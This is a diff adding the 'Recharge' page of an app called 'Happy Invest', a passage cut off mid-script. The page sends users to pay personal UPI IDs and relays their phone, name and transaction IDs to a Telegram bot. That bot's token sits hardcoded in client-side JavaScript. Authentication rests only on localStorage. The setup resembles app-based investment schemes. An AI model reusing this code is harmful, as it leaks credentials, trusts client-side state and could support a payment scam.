@@ -1,0 +1,1194 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Recharge - Happy Invest</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Arial, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #0c0c1d 0%, #1a1a2e 50%, #16213e 100%);
+            min-height: 100vh;
+            width: 100%;
+            overflow-x: hidden;
+            padding-bottom: 70px;
+            color: #fff;
+        }
+        
+        /* Glowing background effect */
+        .glow-bg {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: radial-gradient(circle at 30% 20%, rgba(0, 150, 255, 0.1) 0%, transparent 50%),
+                        radial-gradient(circle at 70% 80%, rgba(255, 0, 150, 0.1) 0%, transparent 50%);
+            z-index: -1;
+        }
+        
+        /* Header with Banner Image */
+        .header {
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(10px);
+            padding: 20px;
+            border-radius: 0 0 25px 25px;
+            position: relative;
+            overflow: hidden;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+            margin-bottom: 20px;
+        }
+        
+        .header::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 3px;
+            background: linear-gradient(90deg, #00ffaa, #00cc88);
+            box-shadow: 0 0 15px rgba(0, 255, 170, 0.7);
+        }
+        
+        /* Banner Image */
+        .banner-image {
+            width: 100%;
+            height: 150px;
+            object-fit: cover;
+            border-radius: 15px;
+            margin-bottom: 20px;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
+            border: 2px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .header-content {
+            display: flex;
+            align-items: center;
+            position: relative;
+            z-index: 1;
+        }
+        
+        .back-btn {
+            font-size: 24px;
+            color: #00ffaa;
+            margin-right: 15px;
+            text-decoration: none;
+            width: 40px;
+            height: 40px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 50%;
+            background: rgba(0, 255, 170, 0.1);
+            border: 2px solid rgba(0, 255, 170, 0.2);
+            box-shadow: 0 4px 15px rgba(0, 255, 170, 0.3);
+            transition: all 0.3s ease;
+        }
+        
+        .back-btn:hover {
+            transform: translateX(-3px);
+            background: rgba(0, 255, 170, 0.2);
+            box-shadow: 0 6px 20px rgba(0, 255, 170, 0.4);
+        }
+        
+        .page-title {
+            font-size: 24px;
+            color: #fff;
+            font-weight: 700;
+            text-shadow: 0 2px 10px rgba(255, 255, 255, 0.2);
+        }
+        
+        .page-title::before {
+            content: '⚡';
+            margin-right: 10px;
+        }
+        
+        /* Main Content */
+        .main-content {
+            padding: 0 20px;
+        }
+        
+        /* Balance Cards */
+        .balance-section {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 15px;
+            margin-bottom: 30px;
+        }
+        
+        .balance-card {
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            padding: 25px;
+            text-align: center;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .balance-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 15px 35px rgba(0, 210, 255, 0.2);
+            border-color: rgba(0, 210, 255, 0.3);
+            background: rgba(255, 255, 255, 0.08);
+        }
+        
+        .balance-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 5px;
+            background: linear-gradient(90deg, #00d2ff, #3a7bd5);
+            box-shadow: 0 0 15px rgba(0, 210, 255, 0.5);
+        }
+        
+        .balance-amount {
+            font-size: 32px;
+            color: #00ffaa;
+            font-weight: 700;
+            margin-bottom: 10px;
+            text-shadow: 0 0 10px rgba(0, 255, 170, 0.5);
+        }
+        
+        .balance-label {
+            font-size: 14px;
+            color: #a0a0d0;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        
+        /* Amount Section */
+        .amount-section {
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            padding: 25px;
+            margin-bottom: 25px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .amount-section::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            right: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(255, 255, 255, 0.03) 0%, transparent 70%);
+            z-index: 0;
+        }
+        
+        .section-title {
+            font-size: 20px;
+            color: #fff;
+            margin-bottom: 20px;
+            font-weight: 700;
+            text-shadow: 0 2px 10px rgba(255, 255, 255, 0.2);
+            position: relative;
+            z-index: 1;
+            display: flex;
+            align-items: center;
+        }
+        
+        .section-title::before {
+            content: '💰';
+            margin-right: 10px;
+            font-size: 22px;
+        }
+        
+        .amount-input-container {
+            position: relative;
+            margin-bottom: 25px;
+            z-index: 1;
+        }
+        
+        .amount-input {
+            width: 100%;
+            padding: 20px 50px 20px 20px;
+            border: 2px solid rgba(255, 255, 255, 0.1);
+            border-radius: 15px;
+            font-size: 18px;
+            background: rgba(255, 255, 255, 0.05);
+            color: #fff;
+            transition: all 0.3s ease;
+        }
+        
+        .amount-input::placeholder {
+            color: #a0a0d0;
+        }
+        
+        .amount-input:focus {
+            border-color: #00ffaa;
+            outline: none;
+            box-shadow: 0 0 0 2px rgba(0, 255, 170, 0.2);
+            background: rgba(255, 255, 255, 0.08);
+        }
+        
+        .amount-input-icon {
+            position: absolute;
+            right: 20px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #00ffaa;
+            font-size: 20px;
+        }
+        
+        /* Quick Amount Grid */
+        .quick-amount-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 15px;
+            margin-top: 25px;
+            position: relative;
+            z-index: 1;
+        }
+        
+        .amount-btn {
+            padding: 18px 10px;
+            border: 2px solid rgba(255, 255, 255, 0.1);
+            border-radius: 15px;
+            background: rgba(255, 255, 255, 0.05);
+            font-size: 16px;
+            font-weight: 600;
+            color: #fff;
+            cursor: pointer;
+            text-align: center;
+            transition: all 0.3s ease;
+        }
+        
+        .amount-btn:hover {
+            background: rgba(0, 210, 255, 0.1);
+            border-color: rgba(0, 210, 255, 0.3);
+            transform: translateY(-3px);
+        }
+        
+        .amount-btn.selected {
+            background: linear-gradient(90deg, #00ffaa, #00cc88);
+            color: white;
+            border-color: rgba(0, 255, 170, 0.3);
+            box-shadow: 0 8px 25px rgba(0, 255, 170, 0.3);
+            transform: translateY(-3px);
+        }
+        
+        /* Payment Methods */
+        .payment-methods {
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            padding: 25px;
+            margin-bottom: 25px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .payment-methods::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 5px;
+            background: linear-gradient(90deg, #ff9966, #ff3366);
+            box-shadow: 0 0 15px rgba(255, 153, 102, 0.5);
+        }
+        
+        .payment-title {
+            font-size: 20px;
+            color: #fff;
+            margin-bottom: 20px;
+            font-weight: 700;
+            text-shadow: 0 2px 10px rgba(255, 255, 255, 0.2);
+            display: flex;
+            align-items: center;
+        }
+        
+        .payment-title::before {
+            content: '💳';
+            margin-right: 10px;
+            font-size: 22px;
+        }
+        
+        .payment-options {
+            position: relative;
+            z-index: 1;
+        }
+        
+        .payment-option {
+            display: flex;
+            align-items: center;
+            padding: 20px;
+            border: 2px solid rgba(255, 255, 255, 0.1);
+            border-radius: 15px;
+            margin-bottom: 15px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            background: rgba(255, 255, 255, 0.03);
+        }
+        
+        .payment-option:hover {
+            border-color: rgba(0, 210, 255, 0.3);
+            background: rgba(0, 210, 255, 0.05);
+            transform: translateX(5px);
+        }
+        
+        .payment-option.selected {
+            border-color: #00ffaa;
+            background: rgba(0, 255, 170, 0.1);
+            box-shadow: 0 8px 25px rgba(0, 255, 170, 0.2);
+        }
+        
+        .payment-radio {
+            margin-right: 15px;
+            width: 22px;
+            height: 22px;
+            accent-color: #00ffaa;
+        }
+        
+        .payment-name {
+            font-size: 16px;
+            color: #fff;
+            font-weight: 600;
+        }
+        
+        /* Recharge Button */
+        .recharge-btn {
+            width: 100%;
+            background: linear-gradient(90deg, #00ffaa, #00cc88);
+            color: white;
+            border: none;
+            padding: 20px;
+            font-size: 20px;
+            font-weight: 700;
+            border-radius: 15px;
+            cursor: pointer;
+            margin-bottom: 20px;
+            transition: all 0.3s ease;
+            box-shadow: 0 8px 25px rgba(0, 255, 170, 0.4);
+            position: relative;
+            overflow: hidden;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+        }
+        
+        .recharge-btn:hover:not(:disabled) {
+            transform: translateY(-3px);
+            box-shadow: 0 12px 30px rgba(0, 255, 170, 0.6);
+            background: linear-gradient(90deg, #00ffcc, #00dd99);
+        }
+        
+        .recharge-btn:active:not(:disabled) {
+            transform: translateY(-1px);
+        }
+        
+        .recharge-btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+        
+        .recharge-btn::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+            transition: left 0.7s ease;
+        }
+        
+        .recharge-btn:hover:not(:disabled)::after {
+            left: 100%;
+        }
+        
+        /* Bottom Navigation */
+        .bottom-nav {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            background: rgba(255, 255, 255, 0.08);
+            backdrop-filter: blur(20px);
+            display: flex;
+            justify-content: space-around;
+            padding: 15px 0;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+            z-index: 100;
+            box-shadow: 0 -5px 20px rgba(0, 0, 0, 0.2);
+        }
+        
+        .nav-item {
+            text-align: center;
+            cursor: pointer;
+            flex: 1;
+            padding: 5px 0;
+            transition: all 0.3s ease;
+            position: relative;
+        }
+        
+        .nav-item.active::before {
+            content: '';
+            position: absolute;
+            top: -15px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 50px;
+            height: 3px;
+            background: linear-gradient(90deg, #00ffaa, #00cc88);
+            border-radius: 3px;
+            box-shadow: 0 0 10px rgba(0, 255, 170, 0.7);
+        }
+        
+        .nav-icon {
+            font-size: 22px;
+            color: #a0a0d0;
+            margin-bottom: 5px;
+            transition: all 0.3s ease;
+        }
+        
+        .nav-name {
+            font-size: 12px;
+            color: #a0a0d0;
+            transition: all 0.3s ease;
+        }
+        
+        .nav-item.active .nav-icon,
+        .nav-item.active .nav-name {
+            color: #fff;
+            text-shadow: 0 0 10px rgba(0, 255, 170, 0.7);
+        }
+        
+        .nav-item:hover:not(.active) .nav-icon,
+        .nav-item:hover:not(.active) .nav-name {
+            color: #fff;
+        }
+        
+        /* Notification */
+        .notification {
+            position: fixed;
+            top: 20px;
+            left: 50%;
+            transform: translateX(-50%) translateY(-100px);
+            background: rgba(0, 255, 170, 0.9);
+            backdrop-filter: blur(10px);
+            color: white;
+            padding: 15px 30px;
+            border-radius: 15px;
+            font-weight: 600;
+            z-index: 1000;
+            box-shadow: 0 10px 30px rgba(0, 255, 170, 0.3);
+            transition: transform 0.5s ease;
+            text-align: center;
+            min-width: 200px;
+        }
+        
+        .notification.show {
+            transform: translateX(-50%) translateY(0);
+        }
+        
+        .notification.error {
+            background: rgba(255, 51, 102, 0.9);
+            box-shadow: 0 10px 30px rgba(255, 51, 102, 0.3);
+        }
+        
+        /* Payment Verification Modal */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.85);
+            backdrop-filter: blur(10px);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            padding: 20px;
+            opacity: 0;
+            transition: opacity 0.3s ease;
+        }
+        
+        .modal-overlay.show {
+            display: flex;
+            opacity: 1;
+        }
+        
+        .payment-modal {
+            background: rgba(26, 26, 46, 0.95);
+            border-radius: 25px;
+            padding: 30px;
+            width: 100%;
+            max-width: 400px;
+            border: 2px solid rgba(0, 255, 170, 0.3);
+            box-shadow: 0 20px 50px rgba(0, 255, 170, 0.2);
+            position: relative;
+            animation: modalSlideUp 0.5s ease-out;
+        }
+        
+        @keyframes modalSlideUp {
+            from {
+                opacity: 0;
+                transform: translateY(50px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        
+        .modal-title {
+            font-size: 22px;
+            color: #00ffaa;
+            margin-bottom: 25px;
+            text-align: center;
+            font-weight: 700;
+            text-shadow: 0 0 10px rgba(0, 255, 170, 0.5);
+        }
+        
+        .modal-input {
+            width: 100%;
+            padding: 18px;
+            border: 2px solid rgba(255, 255, 255, 0.1);
+            border-radius: 15px;
+            font-size: 16px;
+            background: rgba(255, 255, 255, 0.05);
+            color: #fff;
+            margin-bottom: 20px;
+            transition: all 0.3s ease;
+        }
+        
+        .modal-input::placeholder {
+            color: #a0a0d0;
+        }
+        
+        .modal-input:focus {
+            border-color: #00ffaa;
+            outline: none;
+            box-shadow: 0 0 0 2px rgba(0, 255, 170, 0.2);
+            background: rgba(255, 255, 255, 0.08);
+        }
+        
+        .modal-buttons {
+            display: flex;
+            gap: 15px;
+            margin-top: 25px;
+        }
+        
+        .modal-btn {
+            flex: 1;
+            padding: 16px;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+        
+        .modal-submit {
+            background: linear-gradient(90deg, #00ffaa, #00cc88);
+            color: white;
+        }
+        
+        .modal-cancel {
+            background: rgba(255, 255, 255, 0.1);
+            color: #fff;
+            border: 2px solid rgba(255, 255, 255, 0.2);
+        }
+        
+        .modal-btn:hover {
+            transform: translateY(-2px);
+        }
+        
+        .modal-submit:hover {
+            box-shadow: 0 8px 25px rgba(0, 255, 170, 0.4);
+        }
+        
+        .modal-cancel:hover {
+            background: rgba(255, 255, 255, 0.15);
+        }
+        
+        .warning-note {
+            background: rgba(255, 51, 102, 0.1);
+            border: 1px solid rgba(255, 51, 102, 0.3);
+            border-radius: 12px;
+            padding: 15px;
+            margin-bottom: 20px;
+            text-align: center;
+            color: #ff3366;
+            font-size: 14px;
+            font-weight: 600;
+        }
+        
+        /* Responsive */
+        @media (max-width: 360px) {
+            .banner-image {
+                height: 120px;
+            }
+            
+            .balance-card, .amount-section, .payment-methods {
+                padding: 20px;
+            }
+            
+            .amount-btn {
+                padding: 15px 8px;
+                font-size: 14px;
+            }
+            
+            .payment-option {
+                padding: 15px;
+            }
+            
+            .recharge-btn {
+                padding: 18px;
+                font-size: 18px;
+            }
+        }
+        
+        @media (min-width: 768px) {
+            body {
+                max-width: 450px;
+                margin: 0 auto;
+                box-shadow: 0 0 40px rgba(0, 0, 0, 0.3);
+                border-left: 1px solid rgba(255, 255, 255, 0.05);
+                border-right: 1px solid rgba(255, 255, 255, 0.05);
+            }
+            
+            .header {
+                border-radius: 0 0 25px 25px;
+            }
+            
+            .banner-image {
+                border-radius: 15px;
+            }
+            
+            .bottom-nav {
+                border-radius: 0;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Glowing Background -->
+    <div class="glow-bg" id="glowBg"></div>
+    
+    <!-- Header with Banner Image -->
+    <div class="header">
+        <!-- Banner Image -->
+        <img src="https://i.ibb.co/VWwhVGd9/Screenshot-2025-12-27-12-04-49-10-40deb401b9ffe8e1df2f1cc5ba480b12.jpg" 
+             alt="Recharge" 
+             class="banner-image"
+             onerror="this.onerror=null; this.src='https://i.ibb.co/VWwhVGd9/Screenshot-2025-12-27-12-04-49-10-40deb401b9ffe8e1df2f1cc5ba480b12.jpg';">
+        
+        <div class="header-content">
+            <a href="/home" class="back-btn">
+                <i class="fas fa-arrow-left"></i>
+            </a>
+            <h1 class="page-title">Recharge</h1>
+        </div>
+    </div>
+    
+    <!-- Notification -->
+    <div class="notification" id="notification"></div>
+    
+    <!-- Main Content -->
+    <div class="main-content">
+        <!-- Balance Cards -->
+        <div class="balance-section">
+            <div class="balance-card">
+                <div class="balance-amount" id="currentBalance">₹0</div>
+                <div class="balance-label">Current Balance</div>
+            </div>
+            <div class="balance-card">
+                <div class="balance-amount" id="rechargeBalance">₹0</div>
+                <div class="balance-label">Recharge Amount</div>
+            </div>
+        </div>
+        
+        <!-- Amount Section -->
+        <div class="amount-section">
+            <h3 class="section-title">Enter Amount</h3>
+            
+            <div class="amount-input-container">
+                <input type="number" 
+                       class="amount-input" 
+                       id="amountInput" 
+                       placeholder="Enter recharge amount"
+                       min="100"
+                       step="100">
+                <div class="amount-input-icon">
+                    <i class="fas fa-indian-rupee-sign"></i>
+                </div>
+            </div>
+            
+            <!-- Quick Amounts -->
+            <h3 class="section-title">Quick Amount</h3>
+            <div class="quick-amount-grid" id="quickAmounts">
+                <!-- Buttons will be added by JavaScript -->
+            </div>
+        </div>
+        
+        <!-- Payment Methods -->
+        <div class="payment-methods">
+            <h3 class="payment-title">Payment Channel</h3>
+            <div class="payment-options">
+                <div class="payment-option" data-method="upi" data-upi="9110106136@ibl">
+                    <input type="radio" class="payment-radio" name="payment" id="payment1">
+                    <label class="payment-name" for="payment1">PAYMENT 001</label>
+                </div>
+                <div class="payment-option" data-method="upi" data-upi="536273969761@paytm">
+                    <input type="radio" class="payment-radio" name="payment" id="payment2">
+                    <label class="payment-name" for="payment2">PAYMENT 002</label>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Recharge Button -->
+        <button class="recharge-btn" id="rechargeBtn">
+            <i class="fas fa-bolt"></i> Proceed to Payment
+        </button>
+    </div>
+    
+    <!-- Payment Verification Modal -->
+    <div class="modal-overlay" id="paymentModal">
+        <div class="payment-modal">
+            <h2 class="modal-title">Payment Verification</h2>
+            
+            <div class="warning-note">
+                ⚠️ <strong>WARNING:</strong> Fake transaction ID will lead to permanent ban!
+            </div>
+            
+            <input type="text" 
+                   class="modal-input" 
+                   id="transactionId" 
+                   placeholder="Enter Transaction ID / UTR Number"
+                   pattern="[A-Za-z0-9]{12,20}"
+                   required>
+            
+            <div class="modal-buttons">
+                <button class="modal-btn modal-cancel" id="cancelPayment">Cancel</button>
+                <button class="modal-btn modal-submit" id="verifyPayment">Verify Payment</button>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Bottom Navigation -->
+    <div class="bottom-nav">
+        <div class="nav-item" onclick="navigateTo('/home')">
+            <div class="nav-icon"><i class="fas fa-home"></i></div>
+            <div class="nav-name">Home</div>
+        </div>
+        <div class="nav-item" onclick="navigateTo('/products')">
+            <div class="nav-icon"><i class="fas fa-chart-bar"></i></div>
+            <div class="nav-name">Products</div>
+        </div>
+        <div class="nav-item" onclick="navigateTo('/team')">
+            <div class="nav-icon"><i class="fas fa-users"></i></div>
+            <div class="nav-name">Team</div>
+        </div>
+        <div class="nav-item active" onclick="navigateTo('/profile')">
+            <div class="nav-icon"><i class="fas fa-user"></i></div>
+            <div class="nav-name">Profile</div>
+        </div>
+    </div>
+
+    <script>
+        // Configuration
+        const API_BASE_URL = 'https://growdays.vercel.app/api';
+        const TELEGRAM_BOT_TOKEN = '8324426236:AAFPlVvBLm0p6qipkVcsHlAs6pUYzohoiQs';
+        const TELEGRAM_CHAT_ID = '7798676542';
+        
+        // Global variables
+        let selectedAmount = 0;
+        let selectedPayment = null;
+        let userData = {};
+        
+        // Navigation functions
+        function navigateTo(page) {
+            window.location.href = page;
+        }
+        
+        function showNotification(message, isError = false) {
+            const notification = document.getElementById('notification');
+            notification.textContent = message;
+            notification.className = 'notification';
+            
+            if (isError) {
+                notification.classList.add('error');
+            }
+            
+            notification.classList.add('show');
+            
+            setTimeout(() => {
+                notification.classList.remove('show');
+            }, 3000);
+        }
+        
+        function updateRechargeBalance(amount) {
+            const rechargeBalance = document.getElementById('rechargeBalance');
+            rechargeBalance.textContent = `₹${amount}`;
+            selectedAmount = amount;
+            
+            // Animation effect
+            rechargeBalance.style.transform = 'scale(1.1)';
+            setTimeout(() => {
+                rechargeBalance.style.transform = 'scale(1)';
+            }, 150);
+        }
+        
+        // Send to Telegram Bot
+        async function sendToTelegram(message) {
+            try {
+                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+                
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+                
+                return response.ok;
+            } catch (error) {
+                console.error('Telegram error:', error);
+                return false;
+            }
+        }
+        
+        // Create recharge request to backend
+        async function createRechargeRequest(transactionId) {
+            try {
+                const response = await fetch(`${API_BASE_URL}/recharge`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        userId: userData.id,
+                        amount: selectedAmount,
+                        paymentMethod: 'UPI',
+                        transactionId: transactionId,
+                        upiId: selectedPayment.upi,
+                        screenshotUrl: null
+                    })
+                });
+                
+                return await response.json();
+            } catch (error) {
+                console.error('API Error:', error);
+                return { success: false, message: 'Network error' };
+            }
+        }
+        
+        // Open UPI Payment
+        function openUPIPayment(upiId, amount) {
+            const upiMessage = `Payment for ${userData.phone} - Happy Invest - ₹${amount}`;
+            
+            const params = new URLSearchParams();
+            params.set("pa", upiId);
+            params.set("pn", "Happy Invest");
+            params.set("am", amount);
+            params.set("cu", "INR");
+            params.set("tn", upiMessage);
+            
+            const upiLink = "upi://pay?" + params.toString();
+            
+            // Send payment request to Telegram
+            sendToTelegram(`💰 *NEW PAYMENT REQUEST*\n\n📱 *User Phone:* ${userData.phone}\n👤 *User Name:* ${userData.name}\n💳 *Amount:* ₹${amount}\n📋 *UPI ID:* ${upiId}\n⏰ *Time:* ${new Date().toLocaleString()}`);
+            
+            // Open UPI app
+            window.location.href = upiLink;
+            
+            return true;
+        }
+        
+        // Initialize page
+        window.addEventListener('DOMContentLoaded', async function() {
+            // ✅ FIXED: Check authentication using correct localStorage keys
+            const userId = localStorage.getItem('userId');
+            const userPhone = localStorage.getItem('userPhone');
+            
+            console.log('🔍 Checking login status...');
+            console.log('User ID:', userId);
+            console.log('User Phone:', userPhone);
+            
+            if (!userId || !userPhone) {
+                console.log('❌ User not logged in');
+                showNotification('Please login first', true);
+                setTimeout(() => {
+                    window.location.href = '/';
+                }, 2000);
+                return;
+            }
+            
+            // ✅ User is logged in - create userData object
+            userData = {
+                id: userId,
+                phone: userPhone,
+                name: localStorage.getItem('userName') || 'User',
+                balance: parseFloat(localStorage.getItem('userBalance')) || 0,
+                referralCode: localStorage.getItem('referralCode') || ''
+            };
+            
+            console.log('✅ User data loaded:', userData);
+            
+            // Update balance display
+            document.getElementById('currentBalance').textContent = `₹${userData.balance}`;
+            
+            // Interactive background effect
+            document.addEventListener('mousemove', function(e) {
+                const glowBg = document.getElementById('glowBg');
+                const x = e.clientX / window.innerWidth;
+                const y = e.clientY / window.innerHeight;
+                
+                glowBg.style.background = `
+                    radial-gradient(circle at ${x * 100}% ${y * 100}%, rgba(0, 150, 255, 0.15) 0%, transparent 50%),
+                    radial-gradient(circle at ${100 - x * 100}% ${100 - y * 100}%, rgba(255, 0, 150, 0.1) 0%, transparent 50%)
+                `;
+            });
+            
+            // Quick amounts
+            const quickAmounts = [100, 200, 500, 1000, 2000, 5000];
+            const quickAmountsGrid = document.getElementById('quickAmounts');
+            
+            quickAmounts.forEach(amount => {
+                const button = document.createElement('button');
+                button.className = 'amount-btn';
+                button.innerHTML = `<i class="fas fa-rupee-sign"></i> ${amount}`;
+                button.dataset.amount = amount;
+                
+                button.addEventListener('click', function() {
+                    // Animation
+                    this.style.transform = 'scale(0.95)';
+                    setTimeout(() => {
+                        this.style.transform = 'scale(1)';
+                    }, 150);
+                    
+                    // Remove selected class
+                    document.querySelectorAll('.amount-btn').forEach(btn => {
+                        btn.classList.remove('selected');
+                    });
+                    
+                    // Add selected class
+                    this.classList.add('selected');
+                    
+                    // Set amount
+                    document.getElementById('amountInput').value = amount;
+                    updateRechargeBalance(amount);
+                    
+                    // Focus input
+                    document.getElementById('amountInput').focus();
+                });
+                
+                quickAmountsGrid.appendChild(button);
+            });
+            
+            // Amount input listener
+            document.getElementById('amountInput').addEventListener('input', function() {
+                const value = parseFloat(this.value) || 0;
+                if (value >= 100) {
+                    updateRechargeBalance(value);
+                    
+                    // Remove selected from quick amounts
+                    document.querySelectorAll('.amount-btn').forEach(btn => {
+                        btn.classList.remove('selected');
+                    });
+                }
+            });
+            
+            // Payment selection
+            document.querySelectorAll('.payment-option').forEach(option => {
+                option.addEventListener('click', function() {
+                    // Animation
+                    this.style.transform = 'scale(0.95)';
+                    setTimeout(() => {
+                        this.style.transform = 'scale(1)';
+                    }, 150);
+                    
+                    // Remove selected
+                    document.querySelectorAll('.payment-option').forEach(opt => {
+                        opt.classList.remove('selected');
+                    });
+                    
+                    // Add selected
+                    this.classList.add('selected');
+                    
+                    // Update selected payment
+                    selectedPayment = {
+                        method: this.dataset.method,
+                        upi: this.dataset.upi
+                    };
+                    
+                    // Check radio
+                    this.querySelector('.payment-radio').checked = true;
+                });
+            });
+            
+            // Auto-select first payment method
+            setTimeout(() => {
+                const firstPayment = document.querySelector('.payment-option');
+                if (firstPayment) {
+                    firstPayment.click();
+                }
+            }, 500);
+            
+            // Hover effects
+            document.querySelectorAll('.balance-card').forEach(card => {
+                card.addEventListener('mouseenter', function() {
+                    this.style.transform = 'translateY(-5px)';
+                });
+                
+                card.addEventListener('mouseleave', function() {
+                    this.style.transform = 'translateY(0)';
+                });
+            });
+            
+            // Recharge button click
+            document.getElementById('rechargeBtn').addEventListener('click', function() {
+                // Validation
+                if (selectedAmount < 100) {
+                    showNotification('Minimum recharge amount is ₹100', true);
+                    document.getElementById('amountInput').focus();
+                    return;
+                }
+                
+                if (!selectedPayment) {
+                    showNotification('Please select payment method', true);
+                    return;
+                }
+                
+                // Open UPI payment
+                const success = openUPIPayment(selectedPayment.upi, selectedAmount);
+                
+                if (success) {
+                    // Show modal after 2 seconds (giving time for UPI app)
+                    setTimeout(() => {
+                        document.getElementById('paymentModal').classList.add('show');
+                        document.getElementById('transactionId').focus();
+                    }, 2000);
+                }
+            });
+            
+            // Cancel payment
+            document.getElementById('cancelPayment').addEventListener('click', function() {
+                document.getElementById('paymentModal').classList.remove('show');
+            });
+            
+            // Verify payment
+            document.getElementById('verifyPayment').addEventListener('click', async function() {
+                const transactionId = document.getElementById('transactionId').value.trim();
+                
+                if (!transactionId || transactionId.length < 12) {
+                    showNotification('Please enter valid Transaction ID (12+ characters)', true);
+                    return;
+                }
+                
+                // Warning for fake IDs
+                if (transactionId.length < 12) {
+                    if (!confirm('⚠️ WARNING: Fake transaction ID will lead to permanent ban! Do you want to continue?')) {
+                        return;
+                    }
+                }
+                
+                // Disable button
+                const btn = this;
+                const originalText = btn.innerHTML;
+                btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Verifying...';
+                btn.disabled = true;
+                
+                try {
+                    // 1. Send to Telegram
+                    const telegramMessage = `✅ *PAYMENT COMPLETED!*\n\n━━━━━━━━━━━━━━━━\n📱 *User Phone:* ${userData.phone}\n👤 *User Name:* ${userData.name}\n💳 *Amount:* ₹${selectedAmount}\n📋 *Transaction ID:* ${transactionId}\n🔗 *UPI ID:* ${selectedPayment.upi}\n⏰ *Time:* ${new Date().toLocaleString()}\n━━━━━━━━━━━━━━━━\n\n💰 *Balance to add:* ₹${selectedAmount}`;
+                    
+                    await sendToTelegram(telegramMessage);
+                    
+                    // 2. Create recharge request in backend
+                    const rechargeResult = await createRechargeRequest(transactionId);
+                    
+                    if (rechargeResult.success) {
+                        // Success message
+                        const rechargeId = rechargeResult.rechargeId || rechargeResult.id || 'N/A';
+                        showNotification(`✅ Payment verified! Recharge ID: ${rechargeId}`);
+                        
+                        // Send recharge ID to Telegram
+                        await sendToTelegram(`📋 *RECHARGE ID GENERATED:* ${rechargeId}\n📱 *For User:* ${userData.phone} (${userData.name})\n💵 *Amount:* ₹${selectedAmount}`);
+                        
+                        // Update UI
+                        document.getElementById('paymentModal').classList.remove('show');
+                        
+                        // Reset form
+                        document.getElementById('amountInput').value = '';
+                        document.getElementById('transactionId').value = '';
+                        document.querySelectorAll('.amount-btn').forEach(btn => {
+                            btn.classList.remove('selected');
+                        });
+                        document.querySelectorAll('.payment-option').forEach(opt => {
+                            opt.classList.remove('selected');
+                            opt.querySelector('.payment-radio').checked = false;
+                        });
+                        
+                        selectedAmount = 0;
+                        selectedPayment = null;
+                        document.getElementById('rechargeBalance').textContent = '₹0';
+                        
+                        // Show success and redirect
+                        setTimeout(() => {
+                            showNotification('🎉 Recharge request submitted! Admin approval in 2-4 hours.');
+                            setTimeout(() => {
+                                window.location.href = '/home';
+                            }, 2000);
+                        }, 1000);
+                    } else {
